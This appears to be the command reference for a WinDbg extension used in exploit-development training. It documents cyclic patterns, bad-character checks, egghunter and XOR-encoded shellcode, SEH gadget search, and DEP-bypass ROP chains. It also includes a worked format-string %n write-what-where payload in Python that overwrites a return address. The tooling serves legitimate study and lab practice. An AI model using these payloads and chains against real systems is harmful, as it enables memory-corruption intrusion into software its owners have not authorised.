# Command Reference

All user-facing entry points are invoked via `dx @$osed().<name>(...)`.
Most command calls return `true`/`false` for concise `dx` output. `memory()`, `landing()`, and `math()` return their structured evidence directly, while `can_execute()` returns `true`, `false`, or `null`.
Use `dx @$osed().last_result()` to inspect the full structured `CommandResult`.

## Top-Level Commands

| Command | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `help` | `dx @$osed().help(command?)` | `dx @$osed().help("badchars")` | Lists all commands or one schema. |
| `reload` | `dx @$osed().reload()` | `dx @$osed().reload()` | Clears and re-registers the command registry. |
| `pattern_create` | `dx @$osed().pattern_create(length, type?)` | `dx @$osed().pattern_create(300, "msf")` | Generates cyclic pattern text. |
| `pattern_offset` | `dx @$osed().pattern_offset(value, type?)` | `dx @$osed().pattern_offset(0x39654138, "msf")` | Finds an offset in the selected pattern family. |
| `badchars` | `dx @$osed().badchars(address, exclude?)` | `dx @$osed().badchars(0x00B8F900)` | Compares memory bytes against the expected byte sequence at a known address. |
| `badchar_array` | `dx @$osed().badchar_array(exclude?)` | `dx @$osed().badchar_array([0, 10, 13])` | Generates the test byte array (0x00-0xFF minus excludes) in Python, C, and hex paste-ready forms. |
| `badchar_find` | `dx @$osed().badchar_find(address?, exclude?, windowBytes?, minRun?)` | `dx @$osed().badchar_find()` | Auto-locates the sent test array near an address or the stack pointer, reports the landing address, the first corrupted byte, and the suggested next exclude set. |
| `egghunter` | `dx @$osed().egghunter(tag?, mode?, wow64?)` | `dx @$osed().egghunter("W00T", "ntaccess", false)` | Emits egghunter shellcode as hex and Python bytes. |
| `exploit` | `dx @$osed().exploit(mode, tag?, offset?, address?)` | `dx @$osed().exploit("offset")` | Emits deterministic exploit-workflow command strings. |
| `seh` | `dx @$osed().seh()` | `dx @$osed().seh()` | Walks the current thread SEH chain. x86-only in v1. |
| `triage` | `dx @$osed().triage(patternLength?, badchars?, module?, stackBytes?)` | `dx @$osed().triage(8000, "00 0A 0D", "essfunc", 2048)` | Fast crash triage for control, stack, and gadget context. Uses EIP/ESP on x86 and RIP/RSP on x64; SEH/PPR evidence is x86-only. |
| `findmsp` | `dx @$osed().findmsp(patternLength?, stackBytes?, probeBytes?)` | `dx @$osed().findmsp(20000, 4096)` | Comprehensive cyclic-pattern offset scan across all registers, dword-aligned stack slots, SEH record fields, and pointer targets. Reports pattern offset and a confidence per hit (EXACT = unique offset, CONSERVATIVE = repeats). |
| `memory` | `dx @$osed().memory(address)` | `dx @$osed().memory(0x0012F800)` | Returns normalized region evidence. Unknown semantic flags are `null`; raw numeric metadata is preserved. |
| `landing` | `dx @$osed().landing(address?)` | `dx @$osed().landing()` | Returns byte-range and memory observations at an explicit address or ESP/RSP. |
| `math` | `dx @$osed().math(value, bits?)` | `dx @$osed().math(0xFFFFFFD6, 32)` | Formats integers as hex, signed, unsigned, little-endian bytes, and two's complement. |
| `modules` | `dx @$osed().modules(filter?)` | `dx @$osed().modules("essfunc")` | Lists modules and mitigation state. |
| `rop_find` | `dx @$osed().rop_find(module?, maxResults?, executableOnly?, mode?)` | `dx @$osed().rop_find("essfunc")` | Flat alias for legacy ROP exploration and module triage. |
| `find_bytes` | `dx @$osed().find_bytes(module, bytes, maxResults?, executableOnly?, mode?)` | `dx @$osed().find_bytes("essfunc", "FF E4")` | Finds byte sequences in executable sections. |
| `find_ptr` | `dx @$osed().find_ptr(instruction?, bytes?, module?, executableOnly?, badchars?, maxResults?)` | `dx @$osed().find_ptr({ instruction: 'jmp esp', badchars: [0, 10, 13] })` | Searches for an instruction (`jmp/call/pushret <reg>`) or byte pattern and filters surviving pointers whose address contains no bad characters. Composable filter stack; the live-memory feed for the ROP layer. |
| `rop_suggest` | `dx @$osed().rop_suggest(module?, maxResults?, executableOnly?, mode?, engine?)` | `dx @$osed().rop_suggest("essfunc", 50, true, "fast", "semantic")` | Suggests validated gadget patterns. |
| `retn` | `dx @$osed().retn(module?, maxResults?, executableOnly?, mode?)` | `dx @$osed().retn("essfunc")` | Finds `retn N` gadgets for stdcall chain adjustment. |
| `add_esp` | `dx @$osed().add_esp(module?, maxResults?, executableOnly?, mode?)` | `dx @$osed().add_esp("essfunc")` | Finds `add esp, N ; ret` gadgets. |
| `pivots` | `dx @$osed().pivots(module?, maxResults?, executableOnly?, mode?)` | `dx @$osed().pivots("essfunc")` | Finds stack pivot candidates. Uses ESP patterns on x86 and RSP patterns on x64. |
| `seh_ppr` | `dx @$osed().seh_ppr(module?, exclude?, maxResults?, executableOnly?, mode?)` | `dx @$osed().seh_ppr("libspp.dll", "00 0A 0D")` | Finds and ranks `pop ; pop ; ret` gadgets. |
| `encode` | `dx @$osed().encode(shellcode, exclude?, key?)` | `dx @$osed().encode({ shellcode: "fc e8...", exclude: [0, 10, 13] })` | XOR-encodes shellcode to avoid bad characters. |
| `nop` | `dx @$osed().nop(length, byte?)` | `dx @$osed().nop(16)` | Generates a NOP sled. |
| `rop_template` | `dx @$osed().rop_template(api?, module?)` | `dx @$osed().rop_template("VirtualProtect", "essfunc")` | Prints a commented ROP chain skeleton. |

### Help Model

`help()` lists both top-level commands and namespace helpers. Use a fully qualified helper name for namespace entries:

```js
dx @$osed().help()
dx @$osed().help("badchars")
dx @$osed().help("sc.iat")
dx @$osed().help("rop.query")
```

Most callable helpers also accept `"help"` as their first argument and return usage without inspecting the target process:

```js
dx @$osed().math("help")
dx @$osed().pattern.create("help")
dx @$osed().sc.iat("help")
dx @$osed().rop.query("help")
```

## Analysis Evidence Helpers

### `memory(address)`

The returned evidence contains the queried address, region boundaries when available, semantic access flags, region type, raw numeric values, source, and warnings.

Semantic flags are tri-state:

| Value | Meaning |
| --- | --- |
| `true` | WinDbg metadata confirms the property. |
| `false` | WinDbg metadata confirms the property is absent. |
| `null` | The property could not be established. |

`can_execute(address)` is exactly the `executable` projection of normalized memory evidence. It therefore returns `boolean | null`; unknown metadata is never converted to `false`.

### `landing(address?)`

With no address, `landing()` uses the current architecture's stack pointer (`ESP` or `RSP`). The evidence contains:

- queried address and normalized memory evidence;
- sampled bytes and requested byte count;
- atomic observations with `kind`, `confidence`, optional address and length, and supporting details;
- derived aggregate confidence;
- the current compatibility recommendation field.

Observation kinds currently include NOP and repeated-byte runs, marker bytes, cyclic-pattern matches, known payload prefixes, legacy low-printability windows, memory access and execution state, disassembly status, and inaccessible or truncated byte ranges. A debugger API failure remains unknown and is not reported as a confirmed negative result.

Confidence is derived metadata used for presentation. It is bounded to `[0,1]`, deterministic across observation ordering, and excluded from observation identity.

### `math(value, bits?)`

`math()` formats integer values for debugger arithmetic and payload layout work. `bits` defaults to `32` and accepts `8`, `16`, `32`, or `64`.

The returned evidence contains `hex`, `unsigned`, `signed`, `littleEndianBytes`, and `twosComplement`. Negative inputs are masked into the selected width, so `math(-42, 32)` reports `0xFFFFFFD6` and `D6 FF FF FF`.

### Triage integration

`triage()` uses `LandingEvidence` for stack bytes, landing candidates, read status, and bad-character sampling. It does not independently rescan stack bytes for landing signals. Existing control, SEH, module, and gadget analysis remains separate.

## Format String Namespace

The `fmt` namespace supports the format-string specifier modules: build `%n` write-what-where payloads and locate the controlled parameter index at a live `printf`-family call.

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `fmt.build` | `dx @$osed().fmt.build(addr, value, argIndex, width?, exclude?)` | `dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)` | Builds a `%n` write-what-where payload (address block + format string + Python). Positional form writes one dword; use the object form from JS for multiple writes: `fmt.build({ writes: [{addr,value},...], argIndex: 6, width: "word" })`. |
| `fmt.offset` | `dx @$osed().fmt.offset(marker?, count?, firstArg?)` | `dx @$osed().fmt.offset(0x41414141, 40)` | At a breakpoint on the format call, reports which `%N$` index reaches your buffer and classifies leakable stack/module pointers. `firstArg` (default 8) is the byte offset from ESP to the first vararg. x86/cdecl. |

`width` is `"byte"` (`%hhn`), `"word"` (`%hn`, default), or `"dword"` (`%n`). The builder lays the target addresses in a front block, sorts writes by ascending value so `%c` padding stays non-negative, and accounts for the address-block bytes already printed — the off-by-block error students hit by hand.

### Worked example

Goal: overwrite a saved return address at `0x00402118` with the address of a `jmp esp` gadget, `0x625011AF`, via a `printf(user_buffer)` call.

**1. Break at the format call and locate your parameter index.** Send a buffer beginning with a marker (`AAAA` = `0x41414141`), break on the `printf`, then:

```
0:000> dx @$osed().fmt.offset(0x41414141, 40)

=== Format String Parameter Map ===
[+] ESP: 0x0019FE40  firstArg: +8  marker: 0x41414141
[+] Controlled parameter index: %6$  (use argIndex 6 in fmt.build)
Idx    StackAddr    Value        Meaning
%6$    0x0019FE48   41414141     marker
%7$    0x0019FE4C   77C12340     ptr->kernel32
%8$    0x0019FE50   0019FEC0     ptr->stack
%9$    0x0019FE54   00402000     ptr->KERNELBASE
```

Your buffer is reachable at `%6$`. (The `ptr->*` slots are candidate `%N$s` leaks for defeating ASLR in a separate step.)

**2. Build the write with that index.**

```
0:000> dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)

=== Format String Builder ===
[+] Writes:   1 (word-granularity, 2 chunks)
[+] ArgIndex: 6  Prefix: 0

=== Chunk breakdown ===
Chunk  TargetAddr    Value    Arg   CumCount   Specifier
0      0x00402118    0x11AF   6     4527       %4519c%6$hn
1      0x0040211A    0x6250   7     25168      %20641c%7$hn

=== Address block ===
  18 21 40 00    ; slot 0 -> %6$  (0x00402118)
  1A 21 40 00    ; slot 1 -> %7$  (0x0040211A)

=== Format string ===
%4519c%6$hn%20641c%7$hn

=== Python ===
def p32(v): return struct.pack('<I', v)
payload = (
    p32(0x00402118) +
    p32(0x0040211A) +
    b"%4519c%6$hn%20641c%7$hn"
)
```

The two address dwords occupy `%6$`/`%7$`; the low word `0x11AF` is written first (smaller value → less padding), then the high word `0x6250`. Note the first pad is `4519`, not `4527` — the 8-byte address block is already printed before the first `%c`, which is exactly the accounting the builder does for you.

If a target address contains a badchar (e.g. a null in `0x00402118`), pass `exclude` and the builder warns that the address itself cannot be delivered — that constraint is on the buffer, not something an encoder can fix.

## Semantic ROP Namespace

The `rop` runtime namespace is a semantic query surface. Load a corpus first with `rop.scan(...)` (pasted RP++ output) or `rop.scan_live(...)` (live target memory), then query it with `rop.query(...)` or inspect the derived capability catalog with `rop.capabilities()`.

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `rop.find` | `dx @$osed().rop.find(module?, maxResults?, executableOnly?, mode?)` | `dx @$osed().rop.find("essfunc")` | Runs the legacy ROP helper/module triage from the ROP namespace. |
| `rop.scan` | `dx @$osed().rop.scan(text, options?)` | `dx @$osed().rop.scan("0x1000: pop eax ; ret ;")` | Builds a capability index from pasted RP++ output. |
| `rop.scan_live` | `dx @$osed().rop.scan_live({ module?, badchars?, maxPerPattern? })` | `dx @$osed().rop.scan_live({ module: "essfunc", badchars: [0, 10, 13] })` | Discovers gadgets directly from live target memory (bad-char-filtered addresses), feeds them through the semantic pipeline, and loads the same queryable corpus — no RP++ text, reads only. |
| `rop.query` | `dx @$osed().rop.query(query)` | `dx @$osed().rop.query({ writes: ["eax"], capability: "LOAD_REGISTER" })` | Filters the loaded corpus by semantic fields and capabilities. |
| `rop.capabilities` | `dx @$osed().rop.capabilities()` | `dx @$osed().rop.capabilities()` | Summarizes the capability inventory in the loaded corpus. |
| `rop.chain` | `dx @$osed().rop.chain({ set: { eax: 0xDEADBEEF, ebx: 0x1000 } })` | `dx @$osed().rop.chain({ set: { eax: 0xDEADBEEF } })` | Constructs a register-setup chain from the loaded corpus using real-address gadgets. It can zero value-0 targets with `xor reg, reg ; ret`, co-satisfy compatible registers with pure multi-pop gadgets, and fall back to single `pop reg ; ret`. Emits a paste-ready Python `pack()` layout; reports registers it cannot satisfy. Read-only — emits a chain, never writes target memory. |
| `rop.chain_vp` | `dx @$osed().rop.chain_vp({ virtualProtect?, returnAddress?, lpAddress?, writable? })` | `dx @$osed().rop.chain_vp({ virtualProtect: 0x7C801AD0 })` | VirtualProtect DEP-bypass chain (PUSHAD technique) built from the loaded corpus: resolves every `pop reg ; ret` and the `pushad ; ret` gadget at real addresses, sets `flNewProtect = 0x40`, and leaves named Python placeholders (`VIRTUALPROTECT`, `RETURN_ADDR`, `LP_ADDRESS`, `WRITABLE`) for runtime-dependent values you don't supply. Reports any missing gadget. Read-only. |
| `rop.chain_wpm` | `dx @$osed().rop.chain_wpm({ writeProcessMemory?, returnAddress?, lpBuffer?, nSize?, writable? })` | `dx @$osed().rop.chain_wpm({ writeProcessMemory: 0x7C802213 })` | WriteProcessMemory DEP-bypass chain (PUSHAD technique): copies shellcode to executable memory. Hard-codes `hProcess = 0xFFFFFFFF` (GetCurrentProcess pseudo-handle); leaves `WRITEPROCESSMEMORY`, `RETURN_ADDR`, `LP_BUFFER`, `NSIZE`, `WRITABLE` as named placeholders when not supplied. `lpBaseAddress` is the saved ESP (not directly settable). Read-only. |
| `rop.chain_va` | `dx @$osed().rop.chain_va({ virtualAlloc?, returnAddress?, lpAddress?, flAllocationType?, flProtect? })` | `dx @$osed().rop.chain_va({ virtualAlloc: 0x7C809AE1 })` | VirtualAlloc DEP-bypass chain (PUSHAD technique): allocates RWX memory. Defaults `flAllocationType = 0x1000` (MEM_COMMIT) and `flProtect = 0x40` (PAGE_EXECUTE_READWRITE); both are overridable. `dwSize` is the saved ESP. Read-only. |

`rop.query` supports net register-transform predicates:

```js
dx @$osed().rop.query({ preserves: ["eax"] })
dx @$osed().rop.query({ preservesThroughout: ["eax"] })
dx @$osed().rop.query({ transforms: [{ register: "esi", base: "esi", offset: 4 }] })
dx @$osed().rop.query({ transforms: [{ register: "esi", fromMemory: true }] })
```

`preserves` means the register is unchanged at gadget exit. `preservesThroughout` means no instruction writes the register. Transform queries match derived facts such as `esi = esi + 4`, `esi = eax`, fixed constants, and memory-loaded values; unknown net transforms do not satisfy positive predicates.

## Command Shortcuts

These are aliases backed by top-level commands.

| Shortcut | Underlying command | Example |
| --- | --- | --- |
| `pattern.create` | `pattern_create` | `dx @$osed().pattern.create(300, "msf")` |
| `pattern.offset` | `pattern_offset` | `dx @$osed().pattern.offset(0x39654138, "msf")` |
| `seh.visualize` | `seh` | `dx @$osed().seh.visualize()` |

## Shellcode Helpers

The `sc` namespace exposes module, PE, export, hash, and IAT helpers.

### Module and PE helpers

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `sc.peb` | `dx @$osed().sc.peb()` | `dx @$osed().sc.peb()` | Dumps the current PEB. |
| `sc.modules` | `dx @$osed().sc.modules()` | `dx @$osed().sc.modules()` | Lists loaded modules. |
| `sc.module_pages` | `dx @$osed().sc.module_pages(name)` | `dx @$osed().sc.module_pages("kernel32")` | Reports size and estimated 4 KiB page count. |
| `sc.page_summary` | `dx @$osed().sc.page_summary(name)` | `dx @$osed().sc.page_summary("kernel32")` | Buckets pages by `!vprot` protection value. |
| `sc.base` | `dx @$osed().sc.base(name)` | `dx @$osed().sc.base("kernel32")` | Resolves the module base address. |
| `sc.pe` | `dx @$osed().sc.pe(name)` | `dx @$osed().sc.pe("kernel32")` | Prints PE header fields for the module. |

### Export and hash helpers

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `sc.exports` | `dx @$osed().sc.exports(name, filter?)` | `dx @$osed().sc.exports("kernel32", "Virtual")` | Enumerates exported symbols. |
| `sc.resolve` | `dx @$osed().sc.resolve(module, symbol)` | `dx @$osed().sc.resolve("kernel32", "WinExec")` | Resolves one export to an address. |
| `sc.hashes` | `dx @$osed().sc.hashes(module, algorithm?)` | `dx @$osed().sc.hashes("kernel32", "crc32")` | Hashes named exports. |
| `sc.hash` | `dx @$osed().sc.hash(name, algorithm?)` | `dx @$osed().sc.hash("WinExec", "ROR13")` | Hashes one string. |
| `sc.hashresolve` | `dx @$osed().sc.hashresolve(module, hashValue, algorithm?)` | `dx @$osed().sc.hashresolve("kernel32", 0x7c0dfcaa, "ROR13")` | Resolves a hash back to a symbol. |
| `sc.algorithms` | `dx @$osed().sc.algorithms()` | `dx @$osed().sc.algorithms()` | Lists supported hash algorithms. |
| `sc.exportdir` | `dx @$osed().sc.exportdir(module)` | `dx @$osed().sc.exportdir("kernel32")` | Shows the export directory location and metadata. |
| `sc.export` | `dx @$osed().sc.export(module, symbol)` | `dx @$osed().sc.export("kernel32", "GetProcAddress")` | Shows export address and forwarder data. |
| `sc.exportat` | `dx @$osed().sc.exportat(module, ordinalIndex)` | `dx @$osed().sc.exportat("kernel32", 842)` | Resolves an export by ordinal index. |
| `sc.exportwalk` | `dx @$osed().sc.exportwalk(module, symbol?, verbose?)` | `dx @$osed().sc.exportwalk("kernel32", "GetProcAddress", true)` | Walks the export tables step by step. |

### IAT helpers

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `sc.iat` | `dx @$osed().sc.iat(module?, filter?)` | `dx @$osed().sc.iat("app.exe", "Virtual")` | Enumerates imported addresses for a module, optionally filtering by DLL or symbol substring. |
| `sc.iat_find` | `dx @$osed().sc.iat_find(symbol)` | `dx @$osed().sc.iat_find("VirtualAlloc")` | Searches all loaded modules for matching IAT entries. |
| `sc.iat_ptr` | `dx @$osed().sc.iat_ptr(module, symbol)` | `dx @$osed().sc.iat_ptr("app.exe", "VirtualAlloc")` | Resolves an IAT slot and target pointer for one symbol. |

## Runtime Helpers

These are exposed on `osed` for inspection and cleanup, but they are not part of the command registry.

| Helper | Syntax | Example | Notes |
| --- | --- | --- | --- |
| `last_result` | `dx @$osed().last_result()` | `dx @$osed().last_result()` | Returns the full structured result from the last command. |
| `last_summary` | `dx @$osed().last_summary()` | `dx @$osed().last_summary()` | Returns a compact summary of the last command result. |
| `clear_last_result` | `dx @$osed().clear_last_result()` | `dx @$osed().clear_last_result()` | Clears the stored result snapshot. |
| `can_execute` | `dx @$osed().can_execute(address)` | `dx @$osed().can_execute(0x0012F800)` | Returns the executable field from normalized memory evidence without a separate analysis path. |
